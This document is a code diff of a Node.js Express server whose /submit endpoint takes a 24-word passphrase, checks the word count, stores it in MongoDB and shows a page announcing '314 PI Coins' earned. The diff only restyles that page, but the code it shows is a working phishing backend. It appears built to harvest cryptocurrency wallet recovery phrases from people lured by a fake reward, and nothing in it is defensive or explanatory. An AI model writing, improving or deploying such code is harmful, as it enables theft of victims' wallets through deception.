@@ -5,7 +5,7 @@ const bodyParser = require('body-parser');
 // Create Express app
 const app = express();
 
-// Middleware
+// Middleware to parse incoming requests
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
@@ -26,55 +26,45 @@ const Passphrase = mongoose.model('Passphrase', PassphraseSchema);
 app.post('/submit', async (req, res) => {
     const { passphrase } = req.body;
 
+    // Check if passphrase is 24 words
     if (!passphrase || passphrase.trim().split(" ").length !== 24) {
         return res.status(400).send('Invalid passphrase. Ensure it has exactly 24 words.');
     }
 
     try {
+        // Save passphrase to database
         const newPassphrase = new Passphrase({ passphrase });
         await newPassphrase.save();
-
-        // Send stylish HTML response with CSS
+        
+        // Send a styled success message
         const successMessage = `
-        <html>
-            <head>
-                <style>
-                    body {
-                        font-family: Arial, sans-serif;
-                        background-color: #f4f4f4;
-                        color: #333;
-                        text-align: center;
-                        padding: 50px;
-                    }
-                    .message {
-                        background-color: #4CAF50;
-                        color: white;
-                        font-size: 24px;
-                        font-weight: bold;
-                        padding: 20px;
-                        border-radius: 8px;
-                        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-                        animation: fadeIn 1.5s ease-out;
-                    }
-                    @keyframes fadeIn {
-                        0% {
-                            opacity: 0;
-                            transform: scale(0.95);
+            <html>
+                <head>
+                    <style>
+                        body {
+                            font-family: Arial, sans-serif;
+                            text-align: center;
+                            padding: 50px;
                         }
-                        100% {
-                            opacity: 1;
-                            transform: scale(1);
+                        .success-message {
+                            font-size: 24px;
+                            font-weight: bold;
+                            color: green;
+                            background-color: blue;
+                            padding: 20px;
+                            border-radius: 10px;
+                            text-transform: uppercase;
+                            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
                         }
-                    }
-                </style>
-            </head>
-            <body>
-                <div class="message">
-                    Congratulations!!! You have earned your 314 PI Coins Successfully!!
-                </div>
-            </body>
-        </html>`;
-
+                    </style>
+                </head>
+                <body>
+                    <div class="success-message">
+                        Congratulations!!! You have earned your 314 PI Coins Successfully!!
+                    </div>
+                </body>
+            </html>
+        `;
         res.status(200).send(successMessage);
     } catch (error) {
         console.error('Error saving passphrase:', error);
